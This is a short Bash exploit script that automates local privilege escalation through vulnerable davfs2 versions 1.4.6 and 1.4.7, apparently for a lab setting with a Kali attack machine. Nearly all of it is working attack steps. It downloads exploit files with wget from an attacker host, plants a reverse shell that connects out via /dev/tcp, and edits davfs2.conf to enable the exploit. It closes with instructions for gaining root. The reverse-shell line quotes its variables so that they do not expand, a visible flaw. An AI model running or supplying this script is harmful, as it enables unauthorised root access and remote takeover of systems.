#!/bin/bash
# Written by: ClementC
# Automates the process of exploiting vulnerable davfs2 versions (1.4.6/1.4.7) for Local Privilege Escalation

# PREREQUISITES
# 1. All the stuff that this exploit needs as mentioned in the README
# 2. Netcat listener on your kali listening on whatever port you have specified below
# 3. Python 
# Before running this exploit, please have your netcat listener ready on your kali to catch the incoming reverse shell

# Change this to the user that has permissions to mount remote webdav servers
user='davtest'
# Change kali settings for reverse shell
ip='192.168.119.187'
port='6969'
srvip='8000'

# Change to the users home directory
cd ~
# Download the exploit files needed from your kali machine
wget http://$ip:$srvip/coda.c -O coda.c -q
wget http://$ip:$srvip/Makefile -O Makefile -q
wget http://$ip:$srvip/exploit.sh -O exploit.sh -q
# Upgrades the shell (can be omitted if yoou have upgraded it some other way)
python -c 'import pty; pty.spawn("/bin/bash")'
# To create a reverse shell to your kali
echo '#!/usr/bin/env bash' > /home/$user/rootprog
echo 'bash -i >& /dev/tcp/$ip/$port 0>&1' >> /home/$user/rootprog
# Adds 'kernel_fs' to davfs2.conf file which is required for the exploit to work
echo 'kernel_fs       coda' >> .davfs2/davfs2.conf

echo 'Run the following to get root:'
echo 'chmod +x /home/$user/rootprog'
echo 'chmod +x exploit.sh'
echo './exploit.sh'
echo '*For exploit.sh, just press enter for whatever the program asks of you'
echo 'Hope ya get r00t!'
